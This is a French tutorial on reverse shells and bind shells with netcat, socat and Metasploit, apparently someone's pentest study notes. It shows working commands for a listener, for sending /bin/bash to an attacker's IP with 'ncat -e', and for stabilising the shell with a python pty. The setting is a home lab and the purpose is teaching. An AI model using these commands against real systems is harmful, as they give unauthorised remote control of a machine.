
Un shell est une interface homme machine en ligne de commande.

## __Outils__

Pour mettre en place des reverses shells, on a une mutltitude d'outils disponible.

### Netcat

**Netcat** peut être utilisé pour effectuer beaucoup de choses comme du **banner grabbing** pendant des énumérations. Mais l'usage principale qu'on va en faire est de **pouvoir recevoir une connection** depuis un port.

### Socat

**Socat** peut faire **tous ce que Netcat peut faire** mais aussi **beaucoup d'autres choses**. Les shells socat sont **plus stable** que les shells Netcat.

Les 2 problèmes de socat comparé à Netcat sont :
- La syntaxe est **plus difficile**
- Netcat est installé sur pratiquement toutes les distributions Linux par défaut. Socat est **très rarement installé** par défaut.

### Metasploit multi/handler

C'est le module **`exploit/multi/handler`** de metasploit, il a les **mêmes fonctionnalités** que Netcat ou Socat mais c'est le seul moyen d'intéragir avec un **shell meterpreter** et de gérer des **payloads metasploit**.

### Msfvenom

**[Msfvenom](Metasploit_Msfvenom)** fait aussi partie de msf - metasploit framework, mais c'est un **outil indépendant**. Il est utilisé pour créer des payloads et **aussi des reverses shell**.

### Autres

On peut **[créer des reverses shell pour des langages de programation en particulier ou pour un os particulier](Reverse_shell##__Scripts__)**.


## __Types de shell__

### Reverse shell

Un **reverse shell** est ce qui se produit quand une cible **éxécute un code qui connecte un shell à notre machine** (`/bin/bash` sur linux et `cmd.exe` sur windows). L'avantage d'un reverse shell est qu'on **contourne les règles des firewalls**, cependant le problème est qu'on est obligé de notre coté de **configurer notre réseau pour accepter ce shell**.

Notre machine

```shell
user@ip:~$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```
**Mise en place du listener**.

Machine cible

```shell
root@raspberrypi:/# ncat 192.168.1.100 443 -e /bin/bash
```
**Execution du script**.

Notre machine

```shell
Connection received on 192.168.1.104 47512
ls
Bookshelf
Desktop
Documents
Downloads
Music
Pictures
pi-rfid
prog.py
Public
script.py
script.py.save
Templates
Videos
```
**Execution de commande sur la machine cible**.

### Bind shell

Un **blind shell** est ce qui se produit quand une cible va **démarrer un listener** attaché à un shell. Ce **port** est alors **ouvert** et on peut s'y connecter et obtenir l'execution du shell. L'avantage est qu'**on a aucune configuration à faire sur notre réseau** mais il peut être **empeché par des firewalls**.

Machine cible

```shell
root@raspberrypi:/home/thomas# ncat -vnlp 4433 -e /bin/bash
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4433
Ncat: Listening on 0.0.0.0:4433
Ncat: Connection from 192.168.1.100.
Ncat: Connection from 192.168.1.100:57085.
```
**Lancement du serveur netcat**.

Notre machine

```shell
user@ip:~$ nc 192.168.1.104 4433
ls
Bookshelf
Desktop
Documents
Downloads
Music
Pictures
pi-rfid
prog.py
Public
script.py
script.py.save
Templates
Videos

```
**Connection au port**.

### Interactive shell

Un **shell interactif** est un shell ou une **action utilisateur est requise**. 

![[shell-interactif.png]]

Ici, on peut utiliser la commande **ssh** car **on peut répondre à l'interaction**.

### Non Interactive shell

Un **shell non interactif** n'offre **pas** le luxe des shells *interactif*.

![[shell-non-interactif.png]]

On peut utiliser la commande **whoami** car elle **n'est pas interactive** mais **pas la commande ssh**.


## __Stabilisation__

Lorsque l'on a un shell sur une machine, **plusieurs problèmes** s'expose :

- On ne peut **pas utiliser les flèches**.
- On ne peut **pas utiliser la tabulations**.
- Un simple **CTRL + C tue tout notre shell**.

Pour palier ces problèmes on doit le stabiliser.

### Python

Comme python est installé dans la plupart des machines on peut l'utiliser pour stabiliser notre shell.

#### 1- Embélissement

Une fois dans notre shell la première commande à executer est **`python -c 'import pty;pty.spawn("/bin/bash")'`**.
Cela rendra notre shell **plus beau** mais les touches comme les flèches et les tabulations ne nous serront toujours pas accessible, tout comme le problème du CTRL + C.

```shell
user@ip:~$ nc 192.168.1.104 4433
whoami
root

python -c 'import pty;pty.spawn("/bin/bash")'
root@raspberrypi:/home/user#
```

#### 2- Commande de terme

Pour acceder aux **commandes de termes** comme `clear`, on doit executer la commande **`export TERM=xterm`**.

```shell
root@raspberrypi:/home/user# export TERM=xterm
export TERM=xterm
```

#### 3- Acces aux touches

Pour retirer les problèmes principaux, on va d'abord mettre notre **shell en arrière plan** en utilisant ***CTRL + Z***.
**Une fois dans notre terminal** on va executer la commande **`stty raw -echo; fg`** qui va **désactiver notre propre echo** et donc **donner accès aux touches et à l'auto-completion** puis remettre en premier plan notre shell.

```shell
root@raspberrypi:/home/user# ^Z
[1]+  Stopped                 nc 192.168.1.104 4433
user@ip:~$ stty raw -echo; fg
nc 192.168.1.104 4433

root@raspberrypi:/home/user# ^C
root@raspberrypi:/home/user#
```

